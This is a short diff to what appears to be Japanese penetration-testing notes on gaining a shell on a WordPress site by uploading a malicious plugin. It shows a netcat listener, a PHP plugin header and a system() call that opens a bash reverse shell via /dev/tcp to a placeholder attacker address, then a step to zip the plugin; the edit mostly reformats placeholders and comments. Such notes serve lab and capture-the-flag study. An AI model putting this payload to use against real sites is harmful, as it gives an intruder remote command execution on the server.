@@ -131,11 +131,10 @@ sudo rlwrap nc -lvnp 4444
 	Plugin Name: <プラグイン名>
 	*/
 
-system("bash -c 'bash -i >& /dev/tcp/[AttackerIP]/[Port] 0>&1'");
+system("bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1'");
 ?>
 ```
-	コメント部分は必須。wordpressがプラグイン名を識別する。
-	プラグインヘッダーという。
+- コメント部分は必須で、WordPressがプラグイン名を識別するためのプラグインヘッダーという
 
 3. zip化する
 ```zsh
